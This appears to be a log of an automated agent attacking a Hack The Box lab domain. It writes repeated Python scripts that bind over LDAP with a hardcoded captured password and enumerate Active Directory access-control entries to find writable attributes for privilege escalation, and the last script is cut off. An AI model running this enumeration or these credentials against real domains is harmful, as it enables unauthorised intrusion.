@@ -1,0 +1,1458 @@
+[09:11:43] READ: /htb/state/creds.jsonl
+[09:11:43] READ: /htb/machines/garfield/state/surface.jsonl
+[09:11:48] READ: /htb/machines/garfield/state/creds.jsonl
+[09:11:49] READ: /htb/machines/garfield/notes.md
+[09:12:51] RUN: cat << 'PYEOF' > /tmp/enum_aces.py
+#!/usr/bin/env python3
+"""Enumerate ALL ACEs on l.wilson's object where trustee is IT Support or j.arbuckle."""
+
+import ldap3
+from ldap3.protocol.microsoft import security_descriptor_control
+import struct
+import uuid
+
+DC_IP = "10.129.17.178"
+DOMAIN = "garfield.htb"
+USERNAME = "j.arbuckle"
+PASSWORD = "Th1sD4mnC4t!@1978"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+# Known AD schema GUIDs for common writable attributes
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf96799f-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679e5-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf967a68-0de6-11d0-a285-00aa003049e2": "userParameters",
+    "bf967915-0de6-11d0-a285-00aa003049e2": "codePage",
+    "bf967938-0de6-11d0-a285-00aa003049e2": "countryCode",
+    "bf967a7f-0de6-11d0-a285-00aa003049e2": "wWWHomePage",
+    "bf9679b5-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "msDS-KeyCredentialLink",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "bf967a0a-0de6-11d0-a285-00aa003049e2": "pwdLastSet",
+    "bf967961-0de6-11d0-a285-00aa003049e2": "givenName",
+    "bf9679ab-0de6-11d0-a285-00aa003049e2": "sn",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "member",
+    "bf9679c3-0de6-11d0-a285-00aa003049e2": "telephoneNumber",
+    "bf967966-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967967-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf9679d7-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf9679a4-0de6-11d0-a285-00aa003049e2": "logonHours",
+    "bf9679a5-0de6-11d0-a285-00aa003049e2": "logonWorkstation",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    # Property sets
+    "72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS Host Name Attributes (PS)",
+    "b8119fd0-04f6-4762-ab7a-4986c76b3f9a": "Other Domain Parameters (PS)",
+    "ffa6f046-ca4b-4feb-b40d-04dfee722543": "MS-TS-GatewayAccess (PS)",
+    "037088f8-0ae1-11d2-b422-00a0c968f939": "RAS Information (PS)",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User Account Restrictions (PS)",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "User Logon (PS)",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public Information (PS)",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General Information (PS)",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership (PS)",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal Information (PS)",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email Information (PS)",
+    "e45795b3-9455-11d1-aebd-0000f80367c1": "Web Information (PS)",
+    # Extended rights
+    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
+    "ab721a53-1e2f-11d0-9819-00aa0040529b": "User-Change-Password",
+    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
+    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
+}
+
+# Access mask flags
+ADS_RIGHT_DS_READ_PROP = 0x10
+ADS_RIGHT_DS_WRITE_PROP = 0x20
+ADS_RIGHT_DS_CREATE_CHILD = 0x01
+ADS_RIGHT_DS_DELETE_CHILD = 0x02
+ADS_RIGHT_DS_SELF = 0x08
+ADS_RIGHT_DS_CONTROL_ACCESS = 0x100
+GENERIC_ALL = 0x10000000
+GENERIC_WRITE = 0x40000000
+WRITE_DAC = 0x40000
+WRITE_OWNER = 0x80000
+
+ACE_TYPE_NAMES = {
+    0x00: "ACCESS_ALLOWED",
+    0x05: "ACCESS_ALLOWED_OBJECT",
+    0x01: "ACCESS_DENIED",
+    0x06: "ACCESS_DENIED_OBJECT",
+}
+
+def parse_sid(data, offset):
+    revision = data[offset]
+    sub_count = data[offset+1]
+    authority = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = []
+    for i in range(sub_count):
+        sub = struct.unpack_from('<I', data, offset+8+4*i)[0]
+        subs.append(str(sub))
+    sid_str = f"S-{revision}-{authority}-" + "-".join(subs)
+    return sid_str, offset + 8 + 4*sub_count
+
+def parse_guid(data, offset):
+    raw = data[offset:offset+16]
+    if len(raw) < 16:
+        return None, offset
+    g = uuid.UUID(bytes_le=raw)
+    return str(g), offset+16
+
+def parse_ace(data, offset):
+    ace_type = data[offset]
+    ace_flags = data[offset+1]
+    ace_size = struct.unpack_from('<H', data, offset+2)[0]
+    ace_end = offset + ace_size
+    
+    result = {"type": ace_type, "type_name": ACE_TYPE_NAMES.get(ace_type, f"UNKNOWN({ace_type:02x})"), "flags": ace_flags}
+    
+    pos = offset + 4
+    mask = struct.unpack_from('<I', data, pos)[0]
+    result["mask"] = mask
+    pos += 4
+    
+    result["object_type"] = None
+    result["inherited_object_type"] = None
+    
+    if ace_type in (0x05, 0x06):  # Object ACE types
+        obj_flags = struct.unpack_from('<I', data, pos)[0]
+        pos += 4
+        if obj_flags & 0x01:  # ACE_OBJECT_TYPE_PRESENT
+            guid, pos = parse_guid(data, pos)
+            result["object_type"] = guid
+        if obj_flags & 0x02:  # ACE_INHERITED_OBJECT_TYPE_PRESENT
+            guid, pos = parse_guid(data, pos)
+            result["inherited_object_type"] = guid
+    
+    sid, _ = parse_sid(data, pos)
+    result["trustee_sid"] = sid
+    
+    return result, ace_end
+
+def decode_mask(mask):
+    parts = []
+    if mask & GENERIC_ALL: parts.append("GenericAll")
+    if mask & GENERIC_WRITE: parts.append("GenericWrite")
+    if mask & WRITE_DAC: parts.append("WriteDACL")
+    if mask & WRITE_OWNER: parts.append("WriteOwner")
+    if mask & ADS_RIGHT_DS_WRITE_PROP: parts.append("WriteProp")
+    if mask & ADS_RIGHT_DS_READ_PROP: parts.append("ReadProp")
+    if mask & ADS_RIGHT_DS_CREATE_CHILD: parts.append("CreateChild")
+    if mask & ADS_RIGHT_DS_DELETE_CHILD: parts.append("DeleteChild")
+    if mask & ADS_RIGHT_DS_SELF: parts.append("Self")
+    if mask & ADS_RIGHT_DS_CONTROL_ACCESS: parts.append("ControlAccess")
+    if not parts:
+        parts.append(f"0x{mask:08x}")
+    return "|".join(parts)
+
+server = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user=f"{DOMAIN}\\{USERNAME}", password=PASSWORD, authentication=ldap3.NTLM, auto_bind=True)
+
+# Get IT Support and j.arbuckle SIDs
+conn.search("DC=garfield,DC=htb", "(|(cn=IT Support)(sAMAccountName=j.arbuckle))", attributes=["objectSid", "cn", "sAMAccountName"])
+target_sids = {}
+for entry in conn.entries:
+    sid_bytes = entry["objectSid"].raw_values[0]
+    sid_str, _ = parse_sid(sid_bytes, 0)
+    name = str(entry["cn"]) if "sAMAccountName" not in str(entry) else str(entry.entry_dn)
+    target_sids[sid_str] = name
+    print(f"[*] {name}: {sid_str}")
+
+# Read nTSecurityDescriptor on l.wilson with DACL-only flag
+conn.search(
+    TARGET_DN,
+    "(objectClass=*)",
+    search_scope=ldap3.BASE,
+    attributes=["nTSecurityDescriptor"],
+    controls=[security_descriptor_control(sdflags=0x04)]  # DACL only
+)
+
+if not conn.entries:
+    print("[-] Could not read nTSecurityDescriptor")
+    exit(1)
+
+sd_bytes = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+
+# Parse SD header
+revision = sd_bytes[0]
+control = struct.unpack_from('<H', sd_bytes, 2)[0]
+dacl_offset = struct.unpack_from('<I', sd_bytes, 16)[0]
+
+if dacl_offset == 0:
+    print("[-] No DACL present")
+    exit(1)
+
+# Parse DACL
+dacl_revision = sd_bytes[dacl_offset]
+dacl_size = struct.unpack_from('<H', sd_bytes, dacl_offset+2)[0]
+ace_count = struct.unpack_from('<H', sd_bytes, dacl_offset+4)[0]
+
+print(f"\n[*] DACL: {ace_count} ACEs total on {TARGET_DN}")
+print(f"[*] Looking for ACEs matching: {target_sids}")
+print()
+
+pos = dacl_offset + 8
+matched = 0
+for i in range(ace_count):
+    ace, pos = parse_ace(sd_bytes, pos)
+    if ace["trustee_sid"] in target_sids:
+        matched += 1
+        trustee_name = target_sids[ace["trustee_sid"]]
+        obj_guid = ace["object_type"] or "ALL"
+        inh_guid = ace["inherited_object_type"] or "N/A"
+        
+        obj_name = KNOWN_GUIDS.get(obj_guid, f"UNKNOWN({obj_guid})") if obj_guid != "ALL" else "ALL PROPERTIES"
+        inh_name = KNOWN_GUIDS.get(inh_guid, f"UNKNOWN({inh_guid})") if inh_guid != "N/A" else "N/A"
+        
+        print(f"[ACE {i}] Trustee: {trustee_name} ({ace['trustee_sid']})")
+        print(f"  Type: {ace['type_name']}")
+        print(f"  Mask: {decode_mask(ace['mask'])} (0x{ace['mask']:08x})")
+        print(f"  ObjectType: {obj_name} ({obj_guid})")
+        print(f"  InheritedObjectType: {inh_name} ({inh_guid})")
+        print()
+
+print(f"[*] Total matching ACEs: {matched}")
+
+# Also enumerate ACEs on the Allowed RODC PRG group
+print("\n" + "="*60)
+print("[*] Also checking ACEs on 'Allowed RODC Password Replication Group'")
+conn.search(
+    "DC=garfield,DC=htb",
+    "(cn=Allowed RODC Password Replication Group)",
+    attributes=["distinguishedName"]
+)
+if conn.entries:
+    rodc_grp_dn = str(conn.entries[0].entry_dn)
+    conn.search(
+        rodc_grp_dn,
+        "(objectClass=*)",
+        search_scope=ldap3.BASE,
+        attributes=["nTSecurityDescriptor"],
+        controls=[security_descriptor_control(sdflags=0x04)]
+    )
+    if conn.entries:
+        sd2 = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+        dacl_offset2 = struct.unpack_from('<I', sd2, 16)[0]
+        ace_count2 = struct.unpack_from('<H', sd2, dacl_offset2+4)[0]
+        pos2 = dacl_offset2 + 8
+        matched2 = 0
+        for i in range(ace_count2):
+            ace, pos2 = parse_ace(sd2, pos2)
+            if ace["trustee_sid"] in target_sids:
+                matched2 += 1
+                trustee_name = target_sids[ace["trustee_sid"]]
+                obj_guid = ace["object_type"] or "ALL"
+                obj_name = KNOWN_GUIDS.get(obj_guid, f"UNKNOWN({obj_guid})") if obj_guid != "ALL" else "ALL PROPERTIES"
+                print(f"[ACE {i}] Trustee: {trustee_name} ({ace['trustee_sid']})")
+                print(f"  Type: {ace['type_name']}")
+                print(f"  Mask: {decode_mask(ace['mask'])} (0x{ace['mask']:08x})")
+                print(f"  ObjectType: {obj_name} ({obj_guid})")
+                print()
+        print(f"[*] Total matching ACEs on RODC PRG: {matched2}")
+
+# Also do a schema GUID lookup for any unknown GUIDs we found
+print("\n" + "="*60)
+print("[*] Checking schema for bf9679a8 GUID mapping (verification)")
+conn.search(
+    f"CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+    f"(schemaIDGUID=\\a8\\79\\96\\bf\\e6\\0d\\d0\\11\\a2\\85\\00\\aa\\00\\30\\49\\e2)",
+    attributes=["cn", "lDAPDisplayName", "schemaIDGUID"]
+)
+for e in conn.entries:
+    print(f"  {e['lDAPDisplayName']}: {e.entry_dn}")
+PYEOF
+python3 /tmp/enum_aces.py
+[09:13:39] RUN: cat << 'PYEOF' > /tmp/enum_aces2.py
+#!/usr/bin/env python3
+"""Enumerate ALL ACEs on l.wilson where trustee is IT Support or j.arbuckle."""
+import ldap3
+import struct, uuid
+
+DC_IP = "10.129.17.178"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf96799f-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679e5-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf967a68-0de6-11d0-a285-00aa003049e2": "userParameters",
+    "bf967915-0de6-11d0-a285-00aa003049e2": "codePage",
+    "bf967938-0de6-11d0-a285-00aa003049e2": "countryCode",
+    "bf967a7f-0de6-11d0-a285-00aa003049e2": "wWWHomePage",
+    "bf9679b5-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "msDS-KeyCredentialLink",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "bf967a0a-0de6-11d0-a285-00aa003049e2": "pwdLastSet",
+    "bf967961-0de6-11d0-a285-00aa003049e2": "givenName",
+    "bf9679ab-0de6-11d0-a285-00aa003049e2": "sn",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "member",
+    "bf9679c3-0de6-11d0-a285-00aa003049e2": "telephoneNumber",
+    "bf967966-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967967-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf9679d7-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf9679a4-0de6-11d0-a285-00aa003049e2": "logonHours",
+    "bf9679a5-0de6-11d0-a285-00aa003049e2": "logonWorkstation",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    "72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS Host Name Attributes (PS)",
+    "b8119fd0-04f6-4762-ab7a-4986c76b3f9a": "Other Domain Parameters (PS)",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User Account Restrictions (PS)",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public Information (PS)",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General Information (PS)",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership (PS)",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal Information (PS)",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email Information (PS)",
+    "e45795b3-9455-11d1-aebd-0000f80367c1": "Web Information (PS)",
+    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
+    "ab721a53-1e2f-11d0-9819-00aa0040529b": "User-Change-Password",
+}
+
+def parse_sid(data, offset):
+    rev = data[offset]; sc = data[offset+1]
+    auth = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = [str(struct.unpack_from('<I', data, offset+8+4*i)[0]) for i in range(sc)]
+    return f"S-{rev}-{auth}-" + "-".join(subs), offset+8+4*sc
+
+def parse_guid(data, offset):
+    return str(uuid.UUID(bytes_le=data[offset:offset+16])), offset+16
+
+def parse_ace(data, offset):
+    atype = data[offset]; aflags = data[offset+1]
+    asize = struct.unpack_from('<H', data, offset+2)[0]
+    pos = offset + 4
+    mask = struct.unpack_from('<I', data, pos)[0]; pos += 4
+    ot = it = None
+    if atype in (0x05, 0x06):
+        of = struct.unpack_from('<I', data, pos)[0]; pos += 4
+        if of & 1: ot, pos = parse_guid(data, pos)
+        if of & 2: it, pos = parse_guid(data, pos)
+    sid, _ = parse_sid(data, pos)
+    return {"type": atype, "mask": mask, "object_type": ot, "inherited_object_type": it, "trustee": sid}, offset+asize
+
+def mask_str(m):
+    parts = []
+    if m & 0x10000000: parts.append("GenericAll")
+    if m & 0x40000000: parts.append("GenericWrite")
+    if m & 0x40000: parts.append("WriteDACL")
+    if m & 0x80000: parts.append("WriteOwner")
+    if m & 0x20: parts.append("WriteProp")
+    if m & 0x10: parts.append("ReadProp")
+    if m & 0x08: parts.append("Self")
+    if m & 0x100: parts.append("ControlAccess")
+    return "|".join(parts) if parts else f"0x{m:08x}"
+
+ATYPE_NAMES = {0:"ALLOW", 5:"ALLOW_OBJ", 1:"DENY", 6:"DENY_OBJ"}
+
+# Connect
+srv = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(srv, user="garfield.htb\\j.arbuckle", password="Th1sD4mnC4t!@1978", authentication=ldap3.NTLM, auto_bind=True)
+
+# Get SIDs
+conn.search("DC=garfield,DC=htb", "(|(cn=IT Support)(sAMAccountName=j.arbuckle))", attributes=["objectSid","cn","sAMAccountName"])
+sids = {}
+for e in conn.entries:
+    s, _ = parse_sid(e["objectSid"].raw_values[0], 0)
+    sids[s] = str(e["cn"])
+    print(f"[*] {e['cn']}: {s}")
+
+# SD_FLAGS control: 0x04 = DACL only
+# Build manually: OID 1.2.840.113556.1.4.801, critical=True, value=BER-encoded int 0x04
+import pyasn1.type.univ as univ
+from pyasn1.codec.ber import encoder
+sd_flags_value = encoder.encode(univ.Integer(0x04))
+sd_control = ("1.2.840.113556.1.4.801", True, sd_flags_value)
+
+conn.search(TARGET_DN, "(objectClass=*)", search_scope=ldap3.BASE, 
+            attributes=["nTSecurityDescriptor"], controls=[sd_control])
+
+if not conn.entries:
+    print("[-] Failed to read SD"); exit(1)
+
+sd = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+dacl_off = struct.unpack_from('<I', sd, 16)[0]
+ace_count = struct.unpack_from('<H', sd, dacl_off+4)[0]
+print(f"\n[*] {ace_count} ACEs on {TARGET_DN}")
+print(f"[*] Filtering for SIDs: {sids}\n")
+
+pos = dacl_off + 8
+found = 0
+for i in range(ace_count):
+    ace, pos = parse_ace(sd, pos)
+    if ace["trustee"] in sids:
+        found += 1
+        ot = ace["object_type"] or "ALL"
+        ot_name = KNOWN_GUIDS.get(ot, f"UNKNOWN({ot})") if ot != "ALL" else "ALL"
+        it = ace["inherited_object_type"]
+        it_name = KNOWN_GUIDS.get(it, f"UNKNOWN({it})") if it else "N/A"
+        print(f"[ACE {i}] {ATYPE_NAMES.get(ace['type'],'?')} | Trustee: {sids[ace['trustee']]}")
+        print(f"  Mask: {mask_str(ace['mask'])} (0x{ace['mask']:08x})")
+        print(f"  ObjectType: {ot_name} ({ot})")
+        print(f"  InheritedObjType: {it_name}")
+        print()
+
+print(f"[*] Total matching ACEs: {found}")
+
+# Also look up any unknown GUIDs from schema
+print("\n[*] Schema verification for bf9679a8:")
+conn.search("CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+    "(schemaIDGUID=\\a8\\79\\96\\bf\\e6\\0d\\d0\\11\\a2\\85\\00\\aa\\00\\30\\49\\e2)",
+    attributes=["lDAPDisplayName"])
+for e in conn.entries:
+    print(f"  -> {e['lDAPDisplayName']}")
+PYEOF
+python3 /tmp/enum_aces2.py
+[09:14:22] RUN: cat << 'PYEOF' > /tmp/enum_aces3.py
+#!/usr/bin/env python3
+import ldap3, struct, uuid
+from pyasn1.type.univ import Integer
+from pyasn1.codec.ber import encoder
+
+DC_IP = "10.129.17.178"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf96799f-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679e5-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf9679b5-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "msDS-KeyCredentialLink",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "bf967a0a-0de6-11d0-a285-00aa003049e2": "pwdLastSet",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "member",
+    "bf967966-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967967-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf9679d7-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf9679a4-0de6-11d0-a285-00aa003049e2": "logonHours",
+    "bf9679a5-0de6-11d0-a285-00aa003049e2": "logonWorkstation",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User Account Restrictions (PS)",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General Information (PS)",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership (PS)",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal Information (PS)",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email Information (PS)",
+    "e45795b3-9455-11d1-aebd-0000f80367c1": "Web Information (PS)",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public Information (PS)",
+    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
+}
+
+def parse_sid(data, offset):
+    rev = data[offset]; sc = data[offset+1]
+    auth = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = [str(struct.unpack_from('<I', data, offset+8+4*i)[0]) for i in range(sc)]
+    return f"S-{rev}-{auth}-" + "-".join(subs), offset+8+4*sc
+
+def parse_ace(data, offset):
+    atype = data[offset]
+    asize = struct.unpack_from('<H', data, offset+2)[0]
+    pos = offset + 4
+    mask = struct.unpack_from('<I', data, pos)[0]; pos += 4
+    ot = it = None
+    if atype in (0x05, 0x06):
+        of = struct.unpack_from('<I', data, pos)[0]; pos += 4
+        if of & 1: ot = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+        if of & 2: it = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+    sid, _ = parse_sid(data, pos)
+    return {"type": atype, "mask": mask, "ot": ot, "it": it, "trustee": sid}, offset+asize
+
+def mask_str(m):
+    p = []
+    if m & 0x10000000: p.append("GenericAll")
+    if m & 0x40000000: p.append("GenericWrite")
+    if m & 0x40000: p.append("WriteDACL")
+    if m & 0x80000: p.append("WriteOwner")
+    if m & 0x20: p.append("WriteProp")
+    if m & 0x10: p.append("ReadProp")
+    if m & 0x08: p.append("Self")
+    if m & 0x100: p.append("ExtRight")
+    if m & 0x04: p.append("ListChildren")
+    if m & 0x80: p.append("DeleteTree")
+    if m & 0x10000: p.append("Delete")
+    if m & 0x20000: p.append("ReadControl")
+    return "|".join(p) if p else f"0x{m:08x}"
+
+ATYPE = {0:"ALLOW", 5:"ALLOW_OBJ", 1:"DENY", 6:"DENY_OBJ"}
+
+srv = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(srv, user="garfield.htb\\j.arbuckle", password="Th1sD4mnC4t!@1978", authentication=ldap3.NTLM, auto_bind=True)
+print("[+] Bound as j.arbuckle")
+
+# Get SIDs
+conn.search("DC=garfield,DC=htb", "(|(cn=IT Support)(sAMAccountName=j.arbuckle))", attributes=["objectSid","cn"])
+sids = {}
+for e in conn.entries:
+    s, _ = parse_sid(e["objectSid"].raw_values[0], 0)
+    sids[s] = str(e["cn"])
+    print(f"[*] {e['cn']}: {s}")
+
+# Try reading SD without controls first, then with
+print("\n[*] Reading nTSecurityDescriptor on l.wilson...")
+conn.search(TARGET_DN, "(objectClass=*)", search_scope=ldap3.BASE, attributes=["nTSecurityDescriptor"])
+print(f"[*] Result: {conn.result}")
+print(f"[*] Entries: {len(conn.entries)}")
+
+if conn.entries:
+    raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
+    if raw:
+        sd = raw[0]
+        print(f"[*] SD size: {len(sd)} bytes")
+    else:
+        print("[-] nTSecurityDescriptor returned but empty, trying with controls...")
+        # Use controls
+        sd_val = encoder.encode(Integer(0x04))
+        ctrl = [("1.2.840.113556.1.4.801", True, sd_val)]
+        conn.search(TARGET_DN, "(objectClass=*)", search_scope=ldap3.BASE, attributes=["nTSecurityDescriptor"], controls=ctrl)
+        print(f"[*] Result with controls: {conn.result}")
+        if conn.entries and conn.entries[0]["nTSecurityDescriptor"].raw_values:
+            sd = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+            print(f"[*] SD size: {len(sd)} bytes")
+        else:
+            print("[-] Still no SD data"); exit(1)
+else:
+    print("[-] No entries returned"); exit(1)
+
+dacl_off = struct.unpack_from('<I', sd, 16)[0]
+if dacl_off == 0:
+    print("[-] No DACL"); exit(1)
+
+ace_count = struct.unpack_from('<H', sd, dacl_off+4)[0]
+print(f"[*] {ace_count} ACEs in DACL\n")
+
+pos = dacl_off + 8
+found = 0
+for i in range(ace_count):
+    try:
+        ace, pos = parse_ace(sd, pos)
+    except Exception as ex:
+        print(f"[!] Parse error at ACE {i}: {ex}")
+        break
+    if ace["trustee"] in sids:
+        found += 1
+        ot = ace["ot"] or "ALL"
+        ot_name = KNOWN_GUIDS.get(ot, f"UNKNOWN({ot})") if ot != "ALL" else "ALL"
+        it = ace["it"]
+        it_name = KNOWN_GUIDS.get(it, f"UNKNOWN({it})") if it else "N/A"
+        print(f"[ACE {i}] {ATYPE.get(ace['type'],'?')} | {sids[ace['trustee']]}")
+        print(f"  Mask: {mask_str(ace['mask'])} (0x{ace['mask']:08x})")
+        print(f"  ObjectType: {ot_name} ({ot})")
+        if it: print(f"  InheritedObjType: {it_name} ({it})")
+        print()
+
+print(f"[*] Matched ACEs: {found}")
+
+# Schema lookup for bf9679a8
+print("\n[*] Schema: bf9679a8 resolves to:")
+conn.search("CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+    "(schemaIDGUID=\\a8\\79\\96\\bf\\e6\\0d\\d0\\11\\a2\\85\\00\\aa\\00\\30\\49\\e2)",
+    attributes=["lDAPDisplayName"])
+for e in conn.entries: print(f"  -> {e['lDAPDisplayName']}")
+
+# Also look up any UNKNOWN GUIDs in schema
+print("\n[*] Looking up all property GUIDs in schema to identify unknowns...")
+conn.search("CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+    "(schemaIDGUID=*)", attributes=["lDAPDisplayName","schemaIDGUID"],
+    paged_size=500)
+schema_map = {}
+for e in conn.entries:
+    raw_guid = e["schemaIDGUID"].raw_values[0]
+    if len(raw_guid) == 16:
+        g = str(uuid.UUID(bytes_le=raw_guid))
+        schema_map[g] = str(e["lDAPDisplayName"])
+
+# Re-parse and show with full schema resolution
+print(f"\n[*] Re-parsing with full schema map ({len(schema_map)} entries):")
+pos = dacl_off + 8
+for i in range(ace_count):
+    try:
+        ace, pos = parse_ace(sd, pos)
+    except:
+        break
+    if ace["trustee"] in sids:
+        ot = ace["ot"] or "ALL"
+        ot_name = schema_map.get(ot, KNOWN_GUIDS.get(ot, f"UNKNOWN({ot})")) if ot != "ALL" else "ALL"
+        print(f"  [{ATYPE.get(ace['type'],'?')}] {mask_str(ace['mask'])} -> {ot_name} ({ot})")
+PYEOF
+python3 /tmp/enum_aces3.py
+[09:15:02] RUN: cat << 'PYEOF' > /tmp/enum_aces4.py
+#!/usr/bin/env python3
+import ldap3, struct, uuid
+
+DC_IP = "10.129.17.178"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "description",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679e5-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf9679b5-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "msDS-KeyCredentialLink",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "bf967a0a-0de6-11d0-a285-00aa003049e2": "pwdLastSet",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "member",
+    "bf967966-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967967-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf9679d7-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User Account Restrictions (PS)",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General Information (PS)",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal Information (PS)",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email Information (PS)",
+    "e45795b3-9455-11d1-aebd-0000f80367c1": "Web Information (PS)",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public Information (PS)",
+    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
+}
+
+def parse_sid(data, offset):
+    rev = data[offset]; sc = data[offset+1]
+    auth = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = [str(struct.unpack_from('<I', data, offset+8+4*i)[0]) for i in range(sc)]
+    return f"S-{rev}-{auth}-" + "-".join(subs), offset+8+4*sc
+
+def parse_ace(data, offset):
+    atype = data[offset]
+    asize = struct.unpack_from('<H', data, offset+2)[0]
+    pos = offset + 4
+    mask = struct.unpack_from('<I', data, pos)[0]; pos += 4
+    ot = it = None
+    if atype in (0x05, 0x06):
